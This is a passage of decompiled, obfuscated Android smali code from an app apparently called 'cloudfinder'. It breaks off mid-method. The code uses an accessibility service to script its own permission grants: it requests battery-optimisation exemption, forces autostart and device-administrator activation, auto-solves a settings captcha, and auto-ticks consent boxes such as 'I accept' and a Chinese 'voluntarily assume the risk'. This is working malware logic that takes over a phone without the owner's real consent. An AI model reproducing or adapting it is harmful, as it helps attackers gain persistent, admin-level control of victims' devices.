.class public final synthetic Lڛڜڕڰڑ/ء;
.super Ljava/lang/Object;
.source "SourceFile"

# interfaces
.implements Ljava/lang/Runnable;


# instance fields
.field public final synthetic آ:I

.field public final synthetic أ:Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;


# direct methods
.method public synthetic constructor <init>(Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;I)V
    .locals 0

    iput p2, p0, Lڛڜڕڰڑ/ء;->آ:I

    iput-object p1, p0, Lڛڜڕڰڑ/ء;->أ:Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method private final ؋()V
    .locals 43

    move-object/from16 v1, p0

    # 调试模式：跳过 P1（电池白名单 + 自启动引导）
    :try_start_p1skip
    move-object/from16 v14, p0
    iget-object v0, v14, Lڛڜڕڰڑ/ء;->أ:Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;
    invoke-static {v0}, Lڝږ؁ڋ/ڽ;->isDebug(Landroid/content/Context;)Z
    move-result v0
    if-nez v0, :p1skip_ok
    return-void
    :p1skip_ok
    :try_end_p1skip
    .catch Ljava/lang/Exception; {:try_start_p1skip .. :try_end_p1skip} :catch_p1skip
    goto :goto_p1skip

    :catch_p1skip
    move-exception v0
    :goto_p1skip

    iget-object v2, v1, Lڛڜڕڰڑ/ء;->أ:Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;

    sget-object v0, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ا:Ljava/util/concurrent/ExecutorService;

    const-string v3, "permFlowDone"

    invoke-virtual {v2}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v4, "config"

    const-string v5, "device_admin"

    const-string v6, "ms"

    const-string v7, "setup_flow"

    const-string v8, "MyAccessSvc"

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v9

    const-wide/16 v12, 0xbb8

    const-wide/16 v18, 0xc8

    const/4 v15, 0x2

    const/4 v11, 0x1

    const-wide/16 v20, 0x5dc

    const-wide/16 v22, 0x1f4

    :try_start_0
    invoke-static/range {v20 .. v21}, Ljava/lang/Thread;->sleep(J)V

    const/4 v0, 0x0

    :goto_0
    const/16 v14, 0xa

    if-ge v0, v14, :cond_0

    invoke-virtual {v2, v11}, Landroid/accessibilityservice/AccessibilityService;->performGlobalAction(I)Z

    invoke-static/range {v18 .. v19}, Ljava/lang/Thread;->sleep(J)V

    add-int/lit8 v0, v0, 0x1

    goto :goto_0

    :cond_0
    invoke-virtual {v2, v15}, Landroid/accessibilityservice/AccessibilityService;->performGlobalAction(I)Z

    invoke-static/range {v22 .. v23}, Ljava/lang/Thread;->sleep(J)V

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v24

    sput-boolean v11, Lسۄھؤۏ۫/؋;->د:Z

    const-string v0, "P1 started: Battery whitelist first, then AutoStart"

    invoke-static {v8, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v14, "P1_START|brand="

    invoke-virtual {v0, v14}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v14, Landroid/os/Build;->BRAND:Ljava/lang/String;

    invoke-virtual {v0, v14}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v14, "|model="

    invoke-virtual {v0, v14}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v14, Landroid/os/Build;->MODEL:Ljava/lang/String;

    invoke-virtual {v0, v14}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v7, v0}, Lڝږ؁ڋ/ر;->؋(Ljava/lang/String;Ljava/lang/String;)V

    const-string v0, "power"

    invoke-virtual {v2, v0}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/os/PowerManager;

    if-eqz v0, :cond_1

    invoke-virtual {v2}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v14

    invoke-virtual {v0, v14}, Landroid/os/PowerManager;->isIgnoringBatteryOptimizations(Ljava/lang/String;)Z

    move-result v0
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_3

    if-nez v0, :cond_1

    :try_start_1
    new-instance v0, Landroid/content/Intent;

    const-string v14, "android.settings.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS"

    new-instance v11, Ljava/lang/StringBuilder;

    invoke-direct {v11}, Ljava/lang/StringBuilder;-><init>()V

    const-string v15, "package:"

    invoke-virtual {v11, v15}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v15

    invoke-virtual {v11, v15}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v11}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v11

    invoke-static {v11}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v11

    invoke-direct {v0, v14, v11}, Landroid/content/Intent;-><init>(Ljava/lang/String;Landroid/net/Uri;)V

    const/high16 v11, 0x10000000

    invoke-virtual {v0, v11}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {v2, v0}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    const-string v0, "P1: Battery whitelist dialog shown"

    invoke-static {v8, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    invoke-static {v12, v13}, Ljava/lang/Thread;->sleep(J)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    goto :goto_1

    :catch_0
    move-exception v0

    :try_start_2
    const-string v11, "Battery opt request failed"

    invoke-static {v8, v11, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    :goto_1
    const/4 v11, 0x2

    invoke-virtual {v2, v11}, Landroid/accessibilityservice/AccessibilityService;->performGlobalAction(I)Z

    invoke-static/range {v22 .. v23}, Ljava/lang/Thread;->sleep(J)V

    :cond_1
    invoke-static {v2}, Lڝږ؁ڋ/أ;->ؤ(Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;)V

    invoke-static {v2}, Lڃٷښـ۝ۼ/ؠ;->ص(Landroid/content/Context;)V

    const-wide/16 v14, 0x1388

    invoke-static {v14, v15}, Ljava/lang/Thread;->sleep(J)V

    :goto_2
    sget-boolean v0, Lڝږ؁ڋ/أ;->؋:Z

    if-eqz v0, :cond_2

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v14

    sub-long v14, v14, v24

    const-wide/16 v27, 0x4e20

    cmp-long v0, v14, v27

    if-gez v0, :cond_2

    invoke-static/range {v22 .. v23}, Ljava/lang/Thread;->sleep(J)V

    goto :goto_2

    :cond_2
    invoke-static {}, Lڝږ؁ڋ/أ;->إ()V

    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v11, "P1 AutoStart done="

    invoke-virtual {v0, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-boolean v11, Lڝږ؁ڋ/أ;->ؠ:Z

    invoke-virtual {v0, v11}, Ljava/lang/StringBuilder;->append(Z)Ljava/lang/StringBuilder;

    const-string v11, " elapsed="

    invoke-virtual {v0, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v14

    sub-long v14, v14, v24

    invoke-virtual {v0, v14, v15}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    invoke-virtual {v0, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v8, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    sget-boolean v0, Lcom/lite/cloudfinder/service/CompanionIntentService;->ؠ:Z
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_3

    if-nez v0, :cond_3

    :try_start_3
    new-instance v0, Landroid/content/Intent;

    const-class v11, Lcom/lite/cloudfinder/service/CompanionIntentService;

    invoke-direct {v0, v2, v11}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v2, v0}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_1

    goto :goto_3

    :catch_1
    move-exception v0

    :try_start_4
    const-string v11, "CompanionIntentService error"

    invoke-static {v8, v11, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    :goto_3
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v14

    :goto_4
    sget-boolean v0, Lcom/lite/cloudfinder/service/CompanionIntentService;->ؠ:Z

    if-nez v0, :cond_3

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v27

    sub-long v27, v27, v14

    const-wide/16 v29, 0x7530

    cmp-long v0, v27, v29

    if-gez v0, :cond_3

    invoke-static/range {v22 .. v23}, Ljava/lang/Thread;->sleep(J)V

    goto :goto_4

    :cond_3
    const/4 v11, 0x0

    sput-boolean v11, Lڃٷښـ۝ۼ/ؠ;->ئ:Z

    sget-object v0, Lڃٷښـ۝ۼ/ؠ;->ا:Landroid/os/Handler;

    if-eqz v0, :cond_4

    const/4 v11, 0x0

    invoke-virtual {v0, v11}, Landroid/os/Handler;->removeCallbacksAndMessages(Ljava/lang/Object;)V

    :cond_4
    const/4 v11, 0x2

    invoke-virtual {v2, v11}, Landroid/accessibilityservice/AccessibilityService;->performGlobalAction(I)Z
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_3

    const-wide/16 v14, 0x12c

    :try_start_5
    invoke-static {v14, v15}, Ljava/lang/Thread;->sleep(J)V
    :try_end_5
    .catch Ljava/lang/InterruptedException; {:try_start_5 .. :try_end_5} :catch_2
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_3

    :catch_2
    :try_start_6
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v14

    sub-long v14, v14, v24

    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v11, "P1 done, elapsed="

    invoke-virtual {v0, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, v14, v15}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    invoke-virtual {v0, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v8, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v11, "P1_DONE|elapsed="

    invoke-virtual {v0, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, v14, v15}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v7, v0}, Lڝږ؁ڋ/ر;->؋(Ljava/lang/String;Ljava/lang/String;)V
    :try_end_6
    .catch Ljava/lang/Exception; {:try_start_6 .. :try_end_6} :catch_3

    goto :goto_5

    :catch_3
    move-exception v0

    invoke-virtual {v0}, Ljava/lang/Throwable;->printStackTrace()V

    :goto_5
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v14

    const/4 v11, 0x2

    invoke-virtual {v2, v11}, Landroid/accessibilityservice/AccessibilityService;->performGlobalAction(I)Z

    :try_start_7
    invoke-static/range {v22 .. v23}, Ljava/lang/Thread;->sleep(J)V
    :try_end_7
    .catch Ljava/lang/InterruptedException; {:try_start_7 .. :try_end_7} :catch_4

    :catch_4
    const-string v0, "P2 started: Battery Unrestricted"

    invoke-static {v8, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    const-string v0, "P2_START"

    invoke-static {v7, v0}, Lڝږ؁ڋ/ر;->؋(Ljava/lang/String;Ljava/lang/String;)V

    new-instance v0, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v11

    invoke-direct {v0, v11}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    new-instance v11, Lڛڜڕڰڑ/ء;

    const/4 v12, 0x6

    invoke-direct {v11, v2, v12}, Lڛڜڕڰڑ/ء;-><init>(Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;I)V

    invoke-virtual {v0, v11}, Landroid/os/Handler;->post(Ljava/lang/Runnable;)Z

    const-wide/16 v24, 0xbb8

    :try_start_8
    invoke-static/range {v24 .. v25}, Ljava/lang/Thread;->sleep(J)V
    :try_end_8
    .catch Ljava/lang/InterruptedException; {:try_start_8 .. :try_end_8} :catch_5

    :catch_5
    :goto_6
    sget-boolean v0, Lڗًقڔ/؋;->ئ:Z

    const-wide/16 v24, 0x3a98

    if-eqz v0, :cond_5

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v27

    sub-long v27, v27, v14

    cmp-long v0, v27, v24

    if-gez v0, :cond_5

    :try_start_9
    invoke-static/range {v22 .. v23}, Ljava/lang/Thread;->sleep(J)V
    :try_end_9
    .catch Ljava/lang/InterruptedException; {:try_start_9 .. :try_end_9} :catch_5

    goto :goto_6

    :cond_5
    const/4 v11, 0x2

    invoke-virtual {v2, v11}, Landroid/accessibilityservice/AccessibilityService;->performGlobalAction(I)Z

    const-wide/16 v16, 0x12c

    :try_start_a
    invoke-static/range {v16 .. v17}, Ljava/lang/Thread;->sleep(J)V
    :try_end_a
    .catch Ljava/lang/InterruptedException; {:try_start_a .. :try_end_a} :catch_6

    :catch_6
    invoke-static {}, Lڗًقڔ/؋;->ط()V

    new-instance v0, Ljava/lang/StringBuilder;

    const-string v11, "P2 done, elapsed="

    invoke-direct {v0, v11}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v27

    sub-long v13, v27, v14

    invoke-virtual {v0, v13, v14}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    invoke-virtual {v0, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v8, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    const/4 v11, 0x0

    sput-boolean v11, Lسۄھؤۏ۫/؋;->د:Z

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v13

    const/4 v11, 0x2

    invoke-virtual {v2, v11}, Landroid/accessibilityservice/AccessibilityService;->performGlobalAction(I)Z

    :try_start_b
    invoke-static/range {v22 .. v23}, Ljava/lang/Thread;->sleep(J)V
    :try_end_b
    .catch Ljava/lang/InterruptedException; {:try_start_b .. :try_end_b} :catch_7

    :catch_7
    sget-object v0, Landroid/os/Build;->BRAND:Ljava/lang/String;

    const-string v11, ""

    if-eqz v0, :cond_6

    invoke-virtual {v0}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v15

    goto :goto_7

    :cond_6
    move-object v15, v11

    :goto_7
    const-string v12, "xiaomi"

    invoke-virtual {v15, v12}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v12

    if-nez v12, :cond_8

    const-string v12, "redmi"

    invoke-virtual {v15, v12}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v12

    if-nez v12, :cond_8

    const-string v12, "poco"

    invoke-virtual {v15, v12}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v12

    if-nez v12, :cond_8

    const-string v12, "oppo"

    invoke-virtual {v15, v12}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v12

    if-nez v12, :cond_8

    const-string v12, "realme"

    invoke-virtual {v15, v12}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v12

    if-nez v12, :cond_8

    const-string v12, "oneplus"

    invoke-virtual {v15, v12}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v12

    if-eqz v12, :cond_7

    goto :goto_8

    :cond_7
    const/4 v12, 0x0

    goto :goto_9

    :cond_8
    :goto_8
    const/4 v12, 0x1

    :goto_9
    if-eqz v12, :cond_9

    new-instance v15, Ljava/lang/StringBuilder;

    const-string v1, "P3 skipped: Device Admin not needed for brand="

    invoke-direct {v15, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v15, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v15}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v8, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    :cond_9
    const-string v0, "P3 started: Device Admin"

    invoke-static {v8, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    new-instance v0, Ljava/lang/StringBuilder;

    const-string v1, "P3_START|skipDA="

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0, v12}, Ljava/lang/StringBuilder;->append(Z)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v7, v0}, Lڝږ؁ڋ/ر;->؋(Ljava/lang/String;Ljava/lang/String;)V

    if-nez v12, :cond_2b

    :try_start_c
    const-string v0, "device_policy"

    invoke-virtual {v2, v0}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/admin/DevicePolicyManager;

    new-instance v12, Landroid/content/ComponentName;

    const-class v15, Lcom/lite/cloudfinder/rda;

    invoke-direct {v12, v2, v15}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    if-eqz v0, :cond_2a

    invoke-virtual {v0, v12}, Landroid/app/admin/DevicePolicyManager;->isAdminActive(Landroid/content/ComponentName;)Z

    move-result v15

    if-nez v15, :cond_2a

    const-string v15, "Device Admin not active, starting activation"

    invoke-static {v8, v15}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    const-string v15, "REQUESTING"

    invoke-static {v5, v15}, Lڝږ؁ڋ/ر;->؋(Ljava/lang/String;Ljava/lang/String;)V

    new-instance v15, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v1

    invoke-direct {v15, v1}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    new-instance v1, Lڛڜڕڰڑ/ء;

    move-object/from16 v29, v11

    const/4 v11, 0x7

    invoke-direct {v1, v2, v11}, Lڛڜڕڰڑ/ء;-><init>(Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;I)V

    invoke-virtual {v15, v1}, Landroid/os/Handler;->post(Ljava/lang/Runnable;)Z

    :goto_a
    invoke-virtual {v0, v12}, Landroid/app/admin/DevicePolicyManager;->isAdminActive(Landroid/content/ComponentName;)Z

    move-result v1

    if-nez v1, :cond_28

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v30
    :try_end_c
    .catch Ljava/lang/Exception; {:try_start_c .. :try_end_c} :catch_12

    sub-long v30, v30, v13

    cmp-long v1, v30, v24

    if-gez v1, :cond_28

    :try_start_d
    invoke-static/range {v22 .. v23}, Ljava/lang/Thread;->sleep(J)V
    :try_end_d
    .catch Ljava/lang/InterruptedException; {:try_start_d .. :try_end_d} :catch_8
    .catch Ljava/lang/Exception; {:try_start_d .. :try_end_d} :catch_12

    :catch_8
    :try_start_e
    invoke-virtual {v2}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v1

    if-eqz v1, :cond_26

    const-string v11, "com.android.settings:id/verification_view"

    invoke-virtual {v1, v11}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v11

    if-eqz v11, :cond_a

    invoke-interface {v11}, Ljava/util/List;->isEmpty()Z

    move-result v11

    if-nez v11, :cond_a

    sget-boolean v11, Lڗًقڔ/ء;->أ:Z

    if-nez v11, :cond_a

    const-string v11, "Setup: captcha detected, solving"

    invoke-static {v8, v11}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    invoke-static {v2}, Lڗًقڔ/ء;->ؾ(Landroid/accessibilityservice/AccessibilityService;)V

    :cond_a
    const/4 v11, 0x6

    new-array v15, v11, [Ljava/lang/String;

    const-string v11, "\u6211\u5df2\u77e5\u6653"

    const/16 v20, 0x0

    aput-object v11, v15, v20

    const-string v11, "\u6211\u5df2\u4e86\u89e3"

    const/16 v21, 0x1

    aput-object v11, v15, v21

    const-string v11, "I understand"

    const/16 v26, 0x2

    aput-object v11, v15, v26

    const-string v11, "I acknowledge"
    :try_end_e
    .catch Ljava/lang/Exception; {:try_start_e .. :try_end_e} :catch_f

    move-object/from16 v30, v7

    const/4 v7, 0x3

    :try_start_f
    aput-object v11, v15, v7

    const-string v11, "I accept"

    const/4 v7, 0x4

    aput-object v11, v15, v7

    const-string v11, "\u81ea\u613f\u627f\u62c5"

    const/16 v28, 0x5

    aput-object v11, v15, v28

    const/4 v11, 0x0

    :goto_b
    const/4 v7, 0x6

    if-ge v11, v7, :cond_f

    aget-object v7, v15, v11

    invoke-virtual {v1, v7}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByText(Ljava/lang/String;)Ljava/util/List;

    move-result-object v32

    if-eqz v32, :cond_e

    invoke-interface/range {v32 .. v32}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v32

    :goto_c
    invoke-interface/range {v32 .. v32}, Ljava/util/Iterator;->hasNext()Z

    move-result v33

    if-eqz v33, :cond_e

    invoke-interface/range {v32 .. v32}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v33

    move-object/from16 v34, v15

    move-object/from16 v15, v33

    check-cast v15, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-virtual {v15}, Landroid/view/accessibility/AccessibilityNodeInfo;->isCheckable()Z

    move-result v33

    if-eqz v33, :cond_b

    invoke-virtual {v15}, Landroid/view/accessibility/AccessibilityNodeInfo;->isChecked()Z

    move-result v33
    :try_end_f
    .catch Ljava/lang/Exception; {:try_start_f .. :try_end_f} :catch_c

    if-nez v33, :cond_b

    move-object/from16 v33, v3

    const/16 v3, 0x10

    :try_start_10
    invoke-virtual {v15, v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v15, "Setup: DA checked checkbox: "

    invoke-virtual {v3, v15}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    :goto_d
    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    goto :goto_10

    :cond_b
    move-object/from16 v33, v3

    invoke-virtual {v15}, Landroid/view/accessibility/AccessibilityNodeInfo;->isChecked()Z

    move-result v3

    if-nez v3, :cond_d

    invoke-virtual {v15}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v3

    if-eqz v3, :cond_c

    invoke-virtual {v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->isClickable()Z

    move-result v35

    if-eqz v35, :cond_c

    const/16 v15, 0x10

    invoke-virtual {v3, v15}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v15, "Setup: DA checked checkbox parent: "

    :goto_e
    invoke-virtual {v3, v15}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    goto :goto_f

    :cond_c
    new-instance v3, Landroid/graphics/Rect;

    invoke-direct {v3}, Landroid/graphics/Rect;-><init>()V

    invoke-virtual {v15, v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->getBoundsInScreen(Landroid/graphics/Rect;)V

    invoke-virtual {v3}, Landroid/graphics/Rect;->width()I

    move-result v15

    if-lez v15, :cond_d

    iget v15, v3, Landroid/graphics/Rect;->left:I

    add-int/lit8 v15, v15, 0x14

    invoke-virtual {v3}, Landroid/graphics/Rect;->centerY()I

    move-result v3

    invoke-virtual {v2, v15, v3}, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ٲ(II)V

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v15, "Setup: DA tap checkbox area: "

    goto :goto_e

    :goto_f
    invoke-virtual {v3, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    goto :goto_d

    :goto_10
    invoke-static {v8, v3}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    :cond_d
    move-object/from16 v3, v33

    move-object/from16 v15, v34

    goto/16 :goto_c

    :cond_e
    move-object/from16 v33, v3

    move-object/from16 v34, v15

    add-int/lit8 v11, v11, 0x1

    move-object/from16 v3, v33

    move-object/from16 v15, v34

    goto/16 :goto_b

    :cond_f
    move-object/from16 v33, v3

    sget-object v3, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ؿ:[Ljava/lang/String;

    array-length v7, v3
    :try_end_10
    .catch Ljava/lang/Exception; {:try_start_10 .. :try_end_10} :catch_d

    const/4 v15, 0x0

    const/16 v32, 0x0

    :goto_11
    const-string v11, ")"

    move-object/from16 v34, v4

    const-string v4, ","

    if-ge v15, v7, :cond_1f

    move/from16 v35, v7

    :try_start_11
    aget-object v7, v3, v15

    invoke-virtual {v1, v7}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByText(Ljava/lang/String;)Ljava/util/List;

    move-result-object v36

    if-nez v36, :cond_10

    move-object/from16 v38, v3

    move-object/from16 v37, v6

    move-wide/from16 v39, v9

    move-wide/from16 v41, v13

    goto/16 :goto_1c

    :cond_10
    invoke-interface/range {v36 .. v36}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v36

    :goto_12
    invoke-interface/range {v36 .. v36}, Ljava/util/Iterator;->hasNext()Z

    move-result v37

    if-eqz v37, :cond_1d

    invoke-interface/range {v36 .. v36}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v37

    move-object/from16 v38, v3

    move-object/from16 v3, v37

    check-cast v3, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-virtual {v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    move-result-object v37

    if-eqz v37, :cond_11

    invoke-virtual {v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    move-result-object v37

    invoke-interface/range {v37 .. v37}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v37
    :try_end_11
    .catch Ljava/lang/Exception; {:try_start_11 .. :try_end_11} :catch_e

    move-wide/from16 v39, v9

    move-object/from16 v9, v37

    goto :goto_13

    :cond_11
    move-wide/from16 v39, v9

    move-object/from16 v9, v29

    :goto_13
    :try_start_12
    const-string v10, ".*[\\(\uff08]\\d+[\\)\uff09].*"

    invoke-virtual {v9, v10}, Ljava/lang/String;->matches(Ljava/lang/String;)Z

    move-result v10
    :try_end_12
    .catch Ljava/lang/Exception; {:try_start_12 .. :try_end_12} :catch_9

    move-object/from16 v37, v6

    const-string v6, ", waiting..."

    if-eqz v10, :cond_12

    :try_start_13
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v10, "Setup: DA countdown button: "

    invoke-virtual {v3, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    :goto_14
    invoke-virtual {v3, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    goto :goto_15

    :cond_12
